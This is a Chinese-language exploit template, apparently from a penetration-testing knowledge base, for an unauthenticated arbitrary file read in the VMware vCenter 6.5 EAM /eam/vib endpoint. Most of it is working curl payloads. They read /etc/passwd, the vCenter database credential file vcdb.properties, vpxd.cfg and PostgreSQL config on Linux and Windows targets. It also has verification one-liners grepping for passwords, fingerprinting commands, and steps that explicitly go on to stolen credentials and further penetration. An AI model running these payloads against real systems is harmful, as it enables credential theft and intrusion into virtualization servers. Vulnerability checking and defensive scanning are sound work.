---
id: VCENTER-FILE-READ
title: VMware vCenter Server EAM 任意文件读取漏洞
product: vcenter
vendor: VMware
version_affected: "vCenter 6.5.0a - 6.5.0f"
severity: HIGH
tags: [file_read, 无需认证]
fingerprint: ["VMware vCenter", "ID_VC_Welcome", "/ui/login"]
---

## 漏洞描述

VMware vCenter Server 6.5 早期版本中，ESX Agent Manager (EAM) 服务的 `/eam/vib` 端点存在任意文件读取漏洞。攻击者可通过 `id` 参数指定服务器上的文件路径，无需认证即可读取 vCenter 服务器上的任意文件，获取数据库凭据、配置文件等敏感信息。

## 影响版本

- VMware vCenter Server 6.5.0a - 6.5.0f

## 前置条件

- 无需认证
- 目标 vCenter HTTPS 端口（443）可访问
- EAM 服务运行中（默认开启）

## 利用步骤

1. 确认 vCenter 版本在影响范围内
2. 通过 `/eam/vib?id=<filepath>` 读取目标文件
3. 读取数据库配置获取凭据
4. 利用凭据进一步渗透

## Payload

### Linux 目标

```bash
# 读取 /etc/passwd
curl -sk "https://target/eam/vib?id=/etc/passwd"

# 读取 vCenter 数据库配置（包含数据库密码）
curl -sk "https://target/eam/vib?id=/etc/vmware-vpx/vcdb.properties"

# 读取 vCenter 配置
curl -sk "https://target/eam/vib?id=/etc/vmware-vpx/vpxd.cfg"

# 读取 SSO 配置
curl -sk "https://target/eam/vib?id=/opt/vmware/vpostgres/current/pgdata/pg_hba.conf"
```

### Windows 目标

```bash
# 读取 vCenter 数据库配置
curl -sk "https://target/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties"

# 读取 Windows 系统文件
curl -sk "https://target/eam/vib?id=C:\Windows\win.ini"
```

## 验证方法

```bash
# Linux
curl -sk "https://target/eam/vib?id=/etc/passwd" | grep "root:"

# Windows
curl -sk "https://target/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties" | grep -i "password"
```

## 指纹确认

```bash
curl -sk https://target/ | grep -i "vmware\|vCenter\|ID_VC_Welcome"
curl -sk -o /dev/null -w "%{http_code}" "https://target/eam/vib?id=/etc/hostname"
```

## 参考链接

- https://www.vmware.com/security/advisories.html
